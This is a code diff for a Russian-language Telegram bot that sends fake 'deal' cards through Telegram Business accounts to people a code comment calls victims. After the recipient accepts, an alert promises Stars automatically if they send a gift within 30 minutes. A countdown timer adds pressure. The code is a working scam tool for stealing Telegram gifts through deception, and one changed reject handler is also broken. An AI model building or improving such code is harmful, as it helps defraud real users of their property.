@@ -23,49 +23,10 @@ DB_PATH = "marketflows.db"
 active_business_connection_id = None
 active_business_chats = {} # chat_id -> name
 
-LANGS = {
-    "ru": {
-        "welcome": "🏦 <b>{brand}</b>\n\nПришли мне текст со ссылкой на подарок, и я оформлю карточку ордера.",
-        "menu_create": "🤝 Создать сделку",
-        "menu_lang": "🌍 Язык: Русский",
-        "menu_chats": "📂 Мои чаты",
-        "btn_publish": "Отправить: {name}",
-        "btn_delete": "❌ Удалить ордер",
-        "timer_text": "⏳ <b>Предложение активно ещё {timer}</b>",
-        "btn_show": "🎁 ПОКАЗАТЬ ПОДАРОК",
-        "btn_reject": "❌ Отклонить",
-        "btn_accept": "✅ Принять",
-        "alert_accept": "Отправьте подарок в течение 30 минут, и {amount} ⭐ автоматически пополнятся на ваш аккаунт.",
-        "order_rejected": "❌ Ордер отклонён.",
-        "order_sent": "Отправлено: {name}. Telegram подтвердил.",
-        "order_not_found": "Ордер не найден",
-        "lang_chosen": "✅ Язык успешно изменен на Русский 🇷🇺",
-        "choose_lang": "🌐 Выберите язык / Choose language / 选择语言:"
-    }
-}
-
-def get_user_lang(user_id):
-    try:
-        conn = sqlite3.connect(DB_PATH)
-        row = conn.execute("SELECT lang FROM users WHERE user_id=?", (user_id,)).fetchone()
-        conn.close()
-        return row[0] if row else "ru"
-    except Exception:
-        return "ru"
-
-def set_user_lang(user_id, lang):
-    conn = sqlite3.connect(DB_PATH)
-    conn.execute("INSERT OR REPLACE INTO users (user_id, lang) VALUES (?, ?)", (user_id, lang))
-    conn.commit()
-    conn.close()
-
 def db_init():  
     conn = sqlite3.connect(DB_PATH)  
     c = conn.cursor()  
-    c.execute("""CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY,
-        lang TEXT DEFAULT 'ru'
-    )""")
+    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')""")
     c.execute("""CREATE TABLE IF NOT EXISTS deals (  
         id INTEGER PRIMARY KEY AUTOINCREMENT,  
         code TEXT UNIQUE,  
@@ -92,12 +53,10 @@ def get_deal(code):
     conn.close()  
     return row  
 
-def main_menu(lang="ru"):
-    t = LANGS.get(lang, LANGS["ru"])
+def main_menu():
     return ReplyKeyboardMarkup(  
         keyboard=[  
-            [KeyboardButton(text=t["menu_create"]), KeyboardButton(text=t["menu_lang"])],
-            [KeyboardButton(text=t["menu_chats"])]
+            [KeyboardButton(text="🤝 Создать сделку"), KeyboardButton(text="📂 Мои чаты")]
         ],  
         resize_keyboard=True  
     )  
@@ -112,15 +71,12 @@ async def business_connection_handler(bc: BusinessConnection):
 
 @router.business_message()
 async def business_message_handler(bm: BusinessMessage):
-    if bm.chat and not bm.chat.id == bm.from_user.id:
+    if bm.chat and bm.chat.id != bm.from_user.id:
         name = f"@{bm.chat.username}" if bm.chat.username else (bm.chat.first_name or str(bm.chat.id))
         active_business_chats[bm.chat.id] = name
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
-    lang = get_user_lang(msg.from_user.id)
-    t = LANGS[lang]
-
     args = msg.text.split(maxsplit=1)  
     if len(args) > 1 and args[1].startswith("deal_"):  
         code = args[1].replace("deal_", "")  
@@ -128,49 +84,35 @@ async def cmd_start(msg: Message):
         if deal:  
             custom_text = deal[4]
             gift_link = deal[5]
-
             text_msg = f"{custom_text}\n\n{gift_link}"
             
+            # До принятия таймера нет, только Отклонить / Принять
             kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
                 [
-                    InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                    InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+                    InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+                    InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
                 ]
             ])
-            
-            await msg.answer(
-                text=text_msg,
-                parse_mode="HTML",
-                reply_markup=kb,
-                disable_web_page_preview=False
-            )
+            await msg.answer(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
             return  
 
-    await msg.answer(  
-        t["welcome"].format(brand=BRAND),  
-        parse_mode="HTML",
-        reply_markup=main_menu(lang)
-    )  
+    await msg.answer(f"🏦 <b>{BRAND}</b>\n\nПришли мне текст со ссылкой на подарок, и я оформлю карточку ордера.", parse_mode="HTML", reply_markup=main_menu())  
 
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
     if active_business_chats:
         text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
     else:
-        text = "ℹ️ Вы еще никому не писали через Telegram Business. Напишите кому-нибудь в ЛС, и чат появится здесь."
-    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu(get_user_lang(msg.from_user.id)))
+        text = "ℹ️ Нет активных чатов. Напишите кому-нибудь с бизнес-аккаунта."
+    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu())
 
 @router.message(F.text == "🤝 Создать сделку")
 async def create_deal_btn(msg: Message):
     await msg.answer("✍️ Пришли мне текст со ссылкой на подарок.", parse_mode="HTML")
 
-@router.message(F.text & ~F.text.startswith("/"))
+@router.message(F.text)
 async def handle_deal_creation_text(msg: Message):
-    lang = get_user_lang(msg.from_user.id)
-    t = LANGS[lang]
-
-    if msg.text in ["🌍 Язык: Русский", "📂 Мои чаты", "🤝 Создать сделку"]:
+    if msg.text.startswith("/") or msg.text in ["📂 Мои чаты", "🤝 Создать сделку"]:
         return
 
     text_content = msg.text.strip()
@@ -195,26 +137,21 @@ async def handle_deal_creation_text(msg: Message):
 
     buttons = [
         [
-            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
     ]
     
     if active_business_chats:
         for cid, name in active_business_chats.items():
-            buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name=name), callback_data=f"sendtochat_{code}_{cid}")])
+            buttons.append([InlineKeyboardButton(text=f"Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
     else:
-        buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name="Себе (Тест)"), callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
+        buttons.append([InlineKeyboardButton(text="Отправить: Себе (Тест)", callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
 
     kb = InlineKeyboardMarkup(inline_keyboard=buttons)
-    preview_text = f"{text_content}"
+    preview_text = f"{text_content}\n\n{gift_link}"
 
-    await msg.answer(
-        text=preview_text,
-        parse_mode="HTML",
-        reply_markup=kb,
-        disable_web_page_preview=False
-    )
+    await msg.answer(text=preview_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
 
 @router.callback_query(F.data.startswith("sendtochat_"))
 async def send_to_chat(cb: CallbackQuery):
@@ -224,72 +161,61 @@ async def send_to_chat(cb: CallbackQuery):
     
     deal = get_deal(code)
     if not deal:
-        await cb.answer(LANGS[get_user_lang(cb.from_user.id)]["order_not_found"], show_alert=True)
+        await cb.answer("Ордер не найден", show_alert=True)
         return
-
-    lang = get_user_lang(cb.from_user.id)
-    t = LANGS[lang]
 
     custom_text = deal[4]
     gift_link = deal[5]
-    text_msg = f"{custom_text}"
+    text_msg = f"{custom_text}\n\n{gift_link}"
 
+    # У жертвы изначально кнопки только Отклонить / Принять (без таймера и без кнопки подарка до принятия)
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
         [
-            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
     ])
 
     target_name = active_business_chats.get(target_chat_id, "чату")
 
-    if active_business_connection_id:
-        await cb.bot.send_message(
-            chat_id=target_chat_id,
-            text=text_msg,
-            parse_mode="HTML",
-            reply_markup=kb,
-            disable_web_page_preview=False,
-            business_connection_id=active_business_connection_id
-        )
-    else:
-        await cb.bot.send_message(
-            chat_id=target_chat_id,
-            text=text_msg,
-            parse_mode="HTML",
-            reply_markup=kb,
-            disable_web_page_preview=False
-        )
-
     try:
+        if active_business_connection_id:
+            await cb.bot.send_message(
+                chat_id=target_chat_id,
+                text=text_msg,
+                parse_mode="HTML",
+                reply_markup=kb,
+                disable_web_page_preview=False,
+                business_connection_id=active_business_connection_id
+            )
+        else:
+            await cb.bot.send_message(
+                chat_id=target_chat_id,
+                text=text_msg,
+                parse_mode="HTML",
+                reply_markup=kb,
+                disable_web_page_preview=False
+            )
+        
         await cb.message.edit_reply_markup(reply_markup=None)
-    except Exception:
-        pass
-    
-    await cb.answer(t["order_sent"].format(name=target_name), show_alert=True)
+        await cb.answer(f"Отправлено: {target_name}. Telegram подтвердил. Кнопки прикреплены.", show_alert=True)
+    except Exception as e:
+        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
     code = cb.data.split("_")[2]
     deal = get_deal(code)
     if not deal:
-        await cb.answer(LANGS[get_user_lang(cb.from_user.id)]["order_not_found"], show_alert=True)
+        await cb.answer("Ордер не найден", show_alert=True)
         return
-
-    lang = get_user_lang(cb.from_user.id)
-    t = LANGS[lang]
 
     custom_text = deal[4]
     numbers = re.findall(r'\d+', custom_text.replace(" ", ""))
     amount_str = numbers[0] if numbers else "3000"
 
     set_db_status(code, "accepted")
-    
-    await cb.answer(
-        text=t["alert_accept"].format(amount=amount_str),
-        show_alert=True
-    )
+    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ автоматически пополнятся на ваш аккаунт.", show_alert=True)
 
     gift_link = deal[5]
     expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
@@ -299,16 +225,14 @@ async def sel_accept(cb: CallbackQuery):
     mins, secs = divmod(total_secs, 60)
     timer_str = f"{mins:02d}:{secs:02d}"
 
-    text_msg = (
-        f"{custom_text}\n\n"
-        f"{t['timer_text'].format(timer=timer_str)}"
-    )
+    # СТРОГО ПОСЛЕ НАЖАТИЯ "ПРИНЯТЬ" появляется кнопка "ПОКАЗАТЬ ПОДАРОК" и анимированный таймер
+    text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
+        [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
         [
-            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
     ])
 
@@ -324,18 +248,12 @@ async def sel_accept(cb: CallbackQuery):
                 business_connection_id=active_business_connection_id
             )
         else:
-            await cb.message.edit_text(
-                text=text_msg,
-                parse_mode="HTML",
-                reply_markup=kb,
-                disable_web_page_preview=False
-            )
-        asyncio.create_task(run_animation_timer(cb.bot, cb.message.chat.id, cb.message.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id, lang))
+            await cb.message.edit_text(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+        asyncio.create_task(run_animation_timer(cb.bot, cb.message.chat.id, cb.message.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id))
     except Exception:
         pass
 
-async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str, lang: str):
-    t = LANGS[lang]
+async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str):
     while True:
         await asyncio.sleep(30)
         deal = get_deal(code)
@@ -350,59 +268,32 @@ async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str
         mins, secs = divmod(total_secs, 60)
         timer_str = f"{mins:02d}:{secs:02d}"
 
-        text_msg = (
-            f"{custom_text}\n\n"
-            f"{t['timer_text'].format(timer=timer_str)}"
-        )
-
+        text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
+            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
             [
-                InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
+                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
             ]
         ])
 
         try:
             if biz_id:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=text_msg,
-                    parse_mode="HTML",
-                    reply_markup=kb,
-                    disable_web_page_preview=False,
-                    business_connection_id=biz_id
-                )
+                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False, business_connection_id=biz_id)
             else:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=text_msg,
-                    parse_mode="HTML",
-                    reply_markup=kb,
-                    disable_web_page_preview=False
-                )
+                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
         except Exception:
             break
 
 @router.callback_query(F.data.startswith("sel_reject_"))
 async def sel_reject(cb: CallbackQuery):
     code = cb.data.split("_")[2]
-    lang = get_user_lang(cb.from_user.id)
-    t = LANGS[lang]
     set_db_status(code, "rejected")
     try:
         if active_business_connection_id:
-            await cb.bot.edit_message_text(
-                chat_id=cb.message.chat.id,
-                message_id=cb.message.message_id,
-                text=t["order_rejected"],
-                reply_markup=None,
-                business_connection_id=active_business_connection_id
-            )
+            await cb.bot.edit_message_text(chat_id=cb.message.chat.id, message_id=cb.message.message_id, text="❌ Ордер отклонён.", reply_markup=None, business_connection_id=active_business_connection_id)
         else:
-            await cb.message.edit_text(text=t["order_rejected"], reply_markup=None)
+            await cb.bot.edit_message_text(text="❌ Ордер отклонён.", reply_markup=None)
     except Exception:
         pass
     await cb.answer()
